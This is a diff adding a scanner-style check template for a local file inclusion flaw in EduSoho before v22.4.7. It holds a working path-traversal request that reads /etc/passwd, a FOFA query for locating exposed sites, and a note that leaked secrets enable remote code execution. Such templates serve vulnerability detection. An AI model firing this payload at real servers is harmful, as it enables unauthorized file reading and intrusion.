@@ -1,0 +1,26 @@
+## id: CNVD-2023-03903
+## name: EduSoho < v22.4.7 - Local File Inclusion
+## author: hack007x
+## severity: high
+## tags: cnvd,cnvd2023,lfi,edushoho,vuln
+## description: The edusoho education and training system <v22.4.7 has unauthorized file reading vulnerability. Through this vulnerability, an attacker can read the contents of the config/parameters.yml file and obtain sensitive information such as the secret value saved in the file and database account password. After the secret value is obtained, an attacker can implement RCE with symfony _fragment routing.
+## affects: edusoho
+## reference: https://blog.csdn.net/qq_41904294/article/details/135007351
+## reference: https://github.com/gobysec/GobyVuls/blob/master/CNVD-2023-03903.md
+## fofa-query: title="Powered By EduSoho" || body="Powered by <a href=\"http://www.edusoho.com/\" target=\"_blank\">EduSoho" || (body="Powered By EduSoho" && body="var app")
+## verification: true
+
+GET /export/classroom-course-statistics?fileNames[]=../../../../../../../etc/passwd HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/
+#@ matcher: body contains "text/csv"
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: 37d82c69f97434ef5f1f929ba8362021419382fb94efd153a12e9df8729e8bda
